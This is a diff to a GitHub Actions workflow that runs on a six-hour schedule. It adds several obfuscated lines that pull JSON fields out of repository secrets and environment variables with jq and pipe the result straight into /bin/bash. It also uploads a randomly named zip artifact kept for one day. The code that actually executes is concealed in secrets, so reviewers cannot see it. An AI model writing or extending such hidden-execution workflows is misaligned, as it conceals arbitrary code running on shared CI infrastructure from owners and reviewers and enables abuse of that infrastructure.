@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '37 0,6,12,18 * * *'
+    - cron: '24 0,6,12,18 * * *'
 permissions:
   contents: read
 concurrency:
@@ -17,14 +17,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          sifg3: ${{ secrets.sifg3 }}
+          csb6083: ${{ secrets.csb6083 }}
         run: |
-          printf '%s' "$sifg3" | jq -r .rl20 | /bin/bash
-          echo $ddhay707 | jq -r .ahx842 | /bin/bash
+          printf '%s' "$csb6083" | jq -r .clb66 | /bin/bash
+          echo $v07 | jq -r .jfni1 | /bin/bash
+          printf '%s' "$ylwr26370" | jq -r .dounc75391 | /bin/bash
+          echo $h57264 | jq -r .ksg1682 | /bin/bash
+          echo $sw8711 | jq -r .ehpw1 | /bin/bash
+          printf '%s' "$m4681" | jq -r .lgvl72539 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
         with:
-          name: EE66GxjL
+          name: KINqZcJs
           path: "*.zip"
           retention-days: 1
